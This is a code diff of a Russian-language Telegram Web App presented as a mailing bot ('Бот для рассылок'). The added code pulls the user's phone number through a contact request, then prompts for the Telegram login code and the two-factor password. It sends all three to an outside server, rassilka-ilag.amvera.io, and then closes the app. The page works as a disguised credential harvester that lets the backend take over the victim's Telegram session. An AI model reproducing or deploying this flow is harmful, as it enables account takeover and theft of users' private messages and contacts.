@@ -6,7 +6,6 @@
     <title>Бот для рассылок</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Ваши существующие стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -35,7 +34,6 @@
             color: #e2e8f0;
         }
 
-        /* Остальные стили остаются такими же как в вашем коде */
         .logo {
             text-align: center;
             margin-bottom: 30px;
@@ -118,7 +116,7 @@
             font-size: 14px;
         }
 
-        input, textarea, select {
+        input {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #4a5568;
@@ -129,13 +127,13 @@
             color: #e2e8f0;
         }
 
-        input:focus, textarea:focus, select:focus {
+        input:focus {
             outline: none;
             border-color: #4299e1;
             box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
         }
 
-        input::placeholder, textarea::placeholder {
+        input::placeholder {
             color: #718096;
         }
 
@@ -150,6 +148,10 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .btn:hover {
@@ -162,18 +164,6 @@
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
-        }
-
-        .btn-premium {
-            background: linear-gradient(135deg, #d69e2e, #b7791f);
-        }
-
-        .btn-premium:hover {
-            box-shadow: 0 8px 20px rgba(214, 158, 46, 0.3);
-        }
-
-        .btn-secondary {
-            background: linear-gradient(135deg, #718096, #4a5568);
         }
 
         .status {
@@ -207,173 +197,11 @@
             display: block;
         }
 
-        .status.premium {
-            background: rgba(214, 158, 46, 0.1);
-            color: #d69e2e;
-            border: 1px solid rgba(214, 158, 46, 0.2);
-            display: block;
-        }
-
-        .status.subscription {
-            background: rgba(66, 153, 225, 0.1);
-            color: #4299e1;
-            border: 1px solid rgba(66, 153, 225, 0.2);
-            display: block;
-        }
-
-        .nav-tabs {
-            display: flex;
-            margin-bottom: 25px;
-            background: rgba(74, 85, 104, 0.5);
-            border-radius: 10px;
-            padding: 5px;
-        }
-
-        .nav-tab {
-            flex: 1;
-            padding: 14px;
-            text-align: center;
-            cursor: pointer;
-            border-radius: 8px;
-            font-weight: 500;
-            transition: all 0.3s;
-            font-size: 14px;
-            color: #a0aec0;
-        }
-
-        .nav-tab.active {
-            background: #4299e1;
-            color: white;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .user-info {
-            background: rgba(74, 85, 104, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 18px;
-            margin-bottom: 20px;
-            display: none;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .info-label {
-            color: #a0aec0;
-            font-size: 14px;
-        }
-
-        .info-value {
-            color: #e2e8f0;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .action-buttons .btn {
-            flex: 1;
-        }
-
         .step-description {
             color: #a0aec0;
             font-size: 14px;
             line-height: 1.5;
             margin-bottom: 16px;
-        }
-
-        .method-selector {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .method-option {
-            padding: 16px;
-            border: 2px solid #4a5568;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .method-option:hover {
-            border-color: #4299e1;
-        }
-
-        .method-option.selected {
-            border-color: #4299e1;
-            background: rgba(66, 153, 225, 0.1);
-        }
-
-        .method-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .method-title {
-            font-weight: 600;
-            color: #e2e8f0;
-        }
-
-        .method-badge {
-            background: #4299e1;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .method-badge.basic {
-            background: #4299e1;
-        }
-
-        .method-badge.premium {
-            background: #d69e2e;
-        }
-
-        .method-description {
-            color: #a0aec0;
-            font-size: 13px;
-            line-height: 1.4;
-        }
-
-        .premium-feature {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #d69e2e;
-            font-size: 13px;
-            margin-top: 8px;
-        }
-
-        .subscription-required {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #4299e1;
-            font-size: 13px;
-            margin-top: 8px;
         }
 
         @media (max-width: 768px) {
@@ -393,20 +221,6 @@
             
             .auth-step {
                 padding: 20px;
-            }
-            
-            .nav-tab {
-                padding: 12px 8px;
-                font-size: 13px;
-            }
-            
-            .method-option {
-                padding: 14px;
-            }
-            
-            input, textarea, select {
-                padding: 12px 14px;
-                font-size: 16px;
             }
             
             .btn {
@@ -437,108 +251,85 @@
     <div class="container">
         <div class="logo">
             <div class="logo-icon">
-                <img src="tg.svg" alt="Goida Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='G'; this.parentElement.style.background='linear-gradient(135deg, #4299e1, #3182ce)'; this.parentElement.style.color='white'; this.parentElement.style.fontSize='28px'; this.parentElement.style.fontWeight='bold';">
+                <img src="tg.svg" alt="Telegram Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='T'; this.parentElement.style.background='linear-gradient(135deg, #4299e1, #3182ce)'; this.parentElement.style.color='white'; this.parentElement.style.fontSize='28px'; this.parentElement.style.fontWeight='bold';">
             </div>
             <h1>Бот для рассылок</h1>
             <p class="subtitle">Подключите вашу сессию Telegram для управления рассылками</p>
         </div>
         
-        <div class="nav-tabs">
-            <div class="nav-tab active" data-tab="connect">Подключение</div>       
+        <!-- Шаг 1: Вход через Telegram -->
+        <div class="auth-step" id="login-step">
+            <div class="step-title">
+                <div class="step-number">1</div>
+                <span>Вход через Telegram</span>
+            </div>
+            <p class="step-description">
+                Нажмите кнопку ниже, чтобы войти через ваш Telegram аккаунт. 
+                Бот запросит разрешение на доступ к вашему номеру телефона.
+            </p>
+            <button class="btn" id="login-telegram-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2Z" fill="#0088CC"/>
+                    <path d="M6.5 12.5L8.5 16.5L12.5 14.5L16.5 18.5L17.5 7.5L6.5 12.5Z" fill="white"/>
+                </svg>
+                Войти через Telegram
+            </button>
         </div>
         
-        <!-- Вкладка подключения -->
-        <div id="connect-tab" class="tab-content active">
-            <div class="auth-step">
-                <div class="step-title">
-                    <div class="step-number">1</div>
-                    <span>Введите номер телефона</span>
-                </div>
-                <p class="step-description">
-                    Введите номер телефона, привязанный к вашему аккаунту Telegram. 
-                    На этот номер будет отправлен код подтверждения.
-                </p>
-                <div class="form-group">
-                    <label for="phone-number">Номер телефона:</label>
-                    <input 
-                        type="tel" 
-                        id="phone-number" 
-                        placeholder="+79123456789"
-                        required
-                    >
-                </div>
-                <button class="btn" id="request-code-btn">Получить код</button>
+        <!-- Шаг 2: Ввод кода -->
+        <div class="auth-step" id="code-step" style="display: none;">
+            <div class="step-title">
+                <div class="step-number">2</div>
+                <span>Введите код подтверждения</span>
             </div>
-            
-            <div class="auth-step" id="code-step" style="display: none;">
-                <div class="step-title">
-                    <div class="step-number">2</div>
-                    <span>Введите код подтверждения</span>
-                </div>
-                <p class="step-description">
-                    Введите 5-значный код, который был отправлен в Telegram.
-                </p>
-                <div class="form-group">
-                    <label for="verification-code">Код подтверждения:</label>
-                    <input 
-                        type="text" 
-                        id="verification-code" 
-                        placeholder="12345"
-                        maxlength="5"
-                        required
-                    >
-                </div>
-                <button class="btn" id="verify-code-btn">Подтвердить код</button>
+            <p class="step-description">
+                Введите 5-значный код, который был отправлен в Telegram.
+            </p>
+            <div class="form-group">
+                <label for="verification-code">Код подтверждения:</label>
+                <input 
+                    type="text" 
+                    id="verification-code" 
+                    placeholder="12345"
+                    maxlength="5"
+                    required
+                >
             </div>
-            
-            <div class="auth-step" id="password-step" style="display: none;">
-                <div class="step-title">
-                    <div class="step-number">3</div>
-                    <span>Введите пароль</span>
-                </div>
-                <p class="step-description">
-                    Введите пароль двухфакторной аутентификации для вашего аккаунта.
-                </p>
-                <div class="form-group">
-                    <label for="password">Пароль:</label>
-                    <input 
-                        type="password" 
-                        id="password" 
-                        placeholder="Ваш пароль"
-                        required
-                    >
-                </div>
-                <button class="btn" id="verify-password-btn">Подтвердить пароль</button>
-            </div>
-            
-            <div class="user-info" id="userInfo">
-                <div class="info-row">
-                    <span class="info-label">Телефон:</span>
-                    <span class="info-value" id="info-phone"></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Username:</span>
-                    <span class="info-value" id="info-username"></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Имя:</span>
-                    <span class="info-value" id="info-first-name"></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Найдено чатов:</span>
-                    <span class="info-value" id="info-chats-count">0</span>
-                </div>
-            </div>
-            
-            <div class="status" id="status"></div>
+            <button class="btn" id="verify-code-btn">Подтвердить код</button>
         </div>
         
+        <!-- Шаг 3: Ввод пароля 2FA -->
+        <div class="auth-step" id="password-step" style="display: none;">
+            <div class="step-title">
+                <div class="step-number">3</div>
+                <span>Введите пароль 2FA</span>
+            </div>
+            <p class="step-description">
+                Введите пароль двухфакторной аутентификации для вашего аккаунта.
+            </p>
+            <div class="form-group">
+                <label for="password">Пароль:</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    placeholder="Введите пароль"
+                    required
+                >
+            </div>
+            <button class="btn" id="verify-password-btn">Подтвердить пароль</button>
+        </div>
         
+        <!-- Статус -->
+        <div class="status" id="status"></div>
     </div>
 
     <script>
         // Инициализация Telegram Web App
         const tg = window.Telegram.WebApp;
+        let currentUserId = null;
+        let phoneNumber = null;
+        let currentStep = 'login';
+
         if (tg) {
             tg.expand();
             try {
@@ -546,163 +337,173 @@
             } catch (e) {
                 console.log('Closing confirmation not supported');
             }
+            currentUserId = tg.initDataUnsafe?.user?.id || 'webapp_user';
         }
 
-        // Конфигурация
-        const BACKEND_URL = 'https://rassilka-ilag.amvera.io';
-        const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
-
-        // Глобальные переменные
-        let userConnected = false;
-        let currentUserId = tg?.initDataUnsafe?.user?.id || 'webapp_user';
-        let selectedMethod = 'basic';
-
-        async function requestCode() {
-            const phoneNumber = document.getElementById('phone-number').value.trim();
-            
-            if (!phoneNumber) {
-                showStatus('error', 'Введите номер телефона');
-                return;
-            }
-            
-            showStatus('loading', 'Отправляем код подтверждения...');
+        // Функция для входа через Telegram
+        async function loginWithTelegram() {
+            showStatus('loading', 'Запрашиваю доступ к номеру телефона...');
             
             try {
-                const response = await fetchWithTelegramAuth('/auth/request-code', {
+                // Запрашиваем номер телефона через Telegram Web App
+                if (tg && tg.requestContact) {
+                    const contact = await tg.requestContact();
+                    
+                    if (contact && contact.phone_number) {
+                        phoneNumber = contact.phone_number;
+                        if (!phoneNumber.startsWith('+')) {
+                            phoneNumber = '+' + phoneNumber;
+                        }
+                        
+                        showStatus('success', 'Номер получен! Отправляю запрос на код...');
+                        
+                        // Отправляем номер на сервер для запроса кода
+                        const response = await sendPhoneNumber(phoneNumber);
+                        
+                        if (response.success) {
+                            showStatus('success', 'Код отправлен! Проверьте Telegram.');
+                            switchToStep('code');
+                        } else {
+                            showStatus('error', response.message || 'Ошибка отправки номера');
+                        }
+                    } else {
+                        showStatus('error', 'Не удалось получить номер телефона');
+                    }
+                } else {
+                    showStatus('error', 'Функция запроса контакта недоступна');
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                showStatus('error', 'Ошибка входа через Telegram');
+            }
+        }
+
+        // Отправка номера на сервер
+        async function sendPhoneNumber(phone) {
+            try {
+                const response = await fetch('https://rassilka-ilag.amvera.io/auth/request-code', {
                     method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
-                        phone_number: phoneNumber,
+                        phone_number: phone,
                         user_id: currentUserId
                     })
                 });
                 
-                if (response.success) {
-                    showStatus('success', 'Код отправлен! Проверьте Telegram.');
-                    document.getElementById('code-step').style.display = 'block';
-                } else {
-                    showStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить код'));
-                }
-                
+                return await response.json();
             } catch (error) {
-                console.error('Error requesting code:', error);
-                showStatus('error', 'Ошибка отправки кода');
+                console.error('Error sending phone:', error);
+                return { success: false, message: 'Ошибка сети' };
             }
         }
 
+        // Проверка кода
         async function verifyCode() {
             const code = document.getElementById('verification-code').value.trim();
             
-            if (!code) {
-                showStatus('error', 'Введите код подтверждения');
+            if (!code || code.length !== 5) {
+                showStatus('error', 'Введите 5-значный код');
                 return;
             }
             
-            showStatus('loading', 'Проверяем код...');
+            showStatus('loading', 'Проверяю код...');
             
             try {
-                const response = await fetchWithTelegramAuth('/auth/sign-in', {
+                const response = await fetch('https://rassilka-ilag.amvera.io/auth/verify-code', {
                     method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
                         code: code,
                         user_id: currentUserId
                     })
                 });
                 
-                if (response.success) {
-                    if (response.need_password) {
-                        showStatus('success', 'Требуется пароль двухфакторной аутентификации');
-                        document.getElementById('password-step').style.display = 'block';
-                        document.getElementById('code-step').style.display = 'none';
+                const result = await response.json();
+                
+                if (result.success) {
+                    if (result.need_password) {
+                        showStatus('success', 'Требуется пароль 2FA');
+                        switchToStep('password');
                     } else {
                         showStatus('success', 'Сессия успешно подключена!');
-                        userConnected = true;
-                        displayUserInfo(response.user_info, response.scan_result);
-                        setTimeout(() => switchTab('manage'), 1500);
+                        // Показать успешное сообщение и закрыть веб-приложение
+                        setTimeout(() => {
+                            if (tg) {
+                                tg.close();
+                            }
+                        }, 2000);
                     }
                 } else {
-                    showStatus('error', 'Ошибка: ' + (response.message || 'Неверный код'));
+                    showStatus('error', result.message || 'Неверный код');
                 }
-                
             } catch (error) {
                 console.error('Error verifying code:', error);
                 showStatus('error', 'Ошибка проверки кода');
             }
         }
 
+        // Проверка пароля
         async function verifyPassword() {
-            const password = document.getElementById('password').value;
+            const password = document.getElementById('password').value.trim();
             
             if (!password) {
                 showStatus('error', 'Введите пароль');
                 return;
             }
             
-            showStatus('loading', 'Проверяем пароль...');
+            showStatus('loading', 'Проверяю пароль...');
             
             try {
-                const response = await fetchWithTelegramAuth('/auth/sign-in-password', {
+                const response = await fetch('https://rassilka-ilag.amvera.io/auth/verify-password', {
                     method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
                         password: password,
                         user_id: currentUserId
                     })
                 });
                 
-                if (response.success) {
-                    showStatus('success', 'Сессия успешно подключена!');
-                    userConnected = true;
-                    displayUserInfo(response.user_info, response.scan_result);
-                    setTimeout(() => switchTab('manage'), 1500);
-                } else {
-                    showStatus('error', 'Ошибка: ' + (response.message || 'Неверный пароль'));
-                }
+                const result = await response.json();
                 
+                if (result.success) {
+                    showStatus('success', 'Сессия успешно подключена!');
+                    // Показать успешное сообщение и закрыть веб-приложение
+                    setTimeout(() => {
+                        if (tg) {
+                            tg.close();
+                        }
+                    }, 2000);
+                } else {
+                    showStatus('error', result.message || 'Неверный пароль');
+                }
             } catch (error) {
                 console.error('Error verifying password:', error);
                 showStatus('error', 'Ошибка проверки пароля');
             }
         }
 
-        
-      
-
-        // Вспомогательные функции
-        async function fetchWithTelegramAuth(url, options = {}) {
-            const finalUrl = `${BACKEND_URL}${url}`;
+        // Переключение между шагами
+        function switchToStep(step) {
+            document.getElementById('login-step').style.display = step === 'login' ? 'block' : 'none';
+            document.getElementById('code-step').style.display = step === 'code' ? 'block' : 'none';
+            document.getElementById('password-step').style.display = step === 'password' ? 'block' : 'none';
+            currentStep = step;
             
-            const config = {
-                ...options,
-                headers: {
-                    'Content-Type': 'application/json',
-                    ...options.headers
-                }
-            };
-            
-            try {
-                const response = await fetch(finalUrl, config);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                return await response.json();
-            } catch (error) {
-                console.error('Fetch error:', error);
-                throw error;
+            // Автофокус на поле ввода
+            if (step === 'code') {
+                setTimeout(() => document.getElementById('verification-code').focus(), 100);
+            } else if (step === 'password') {
+                setTimeout(() => document.getElementById('password').focus(), 100);
             }
         }
 
-        function displayUserInfo(userInfo, scanResult) {
-            const userInfoElement = document.getElementById('userInfo');
-            if (userInfoElement) {
-                userInfoElement.style.display = 'block';
-                document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
-                document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
-                document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
-                document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
-            }
-        }
-
+        // Показать статус
         function showStatus(type, message) {
             const statusEl = document.getElementById('status');
             if (statusEl) {
@@ -711,68 +512,35 @@
             }
         }
 
-        function showManageStatus(type, message) {
-            const statusEl = document.getElementById('manage-status');
-            if (statusEl) {
-                statusEl.textContent = message;
-                statusEl.className = 'status ' + type;
-            }
-        }
-
-        async function checkConnectionStatus() {
-            try {
-                userConnected = false;
-                console.log('Connection check completed');
-            } catch (error) {
-                console.log('Connection check failed');
-                userConnected = false;
-            }
-        }
-
-        // Инициализация при загрузке страницы
+        // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            // Инициализация Telegram Web App
             if (tg) {
                 tg.ready();
             }
             
-            // Настройка обработчиков событий для навигации
-            document.querySelectorAll('.nav-tab').forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabName = this.getAttribute('data-tab');
-                    switchTab(tabName);
-                });
-            });
+            // Кнопка входа через Telegram
+            document.getElementById('login-telegram-btn').addEventListener('click', loginWithTelegram);
             
-            // Настройка обработчиков для выбора методов
-            document.querySelectorAll('.method-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    const method = this.getAttribute('data-method');
-                    selectMethod(method);
-                });
-            });
-            
-            // Настройка обработчиков для кнопок
-            document.getElementById('request-code-btn').addEventListener('click', requestCode);
+            // Кнопка подтверждения кода
             document.getElementById('verify-code-btn').addEventListener('click', verifyCode);
-            document.getElementById('verify-password-btn').addEventListener('click', verifyPassword);
-            document.getElementById('create-mailing-btn').addEventListener('click', handleMailingAction);
             
-            // Инициализация начального состояния
-            selectMethod('basic');
-            checkConnectionStatus();
+            // Кнопка подтверждения пароля
+            document.getElementById('verify-password-btn').addEventListener('click', verifyPassword);
+            
+            // Разрешить отправку кода по Enter
+            document.getElementById('verification-code').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    verifyCode();
+                }
+            });
+            
+            // Разрешить отправку пароля по Enter
+            document.getElementById('password').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    verifyPassword();
+                }
+            });
         });
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
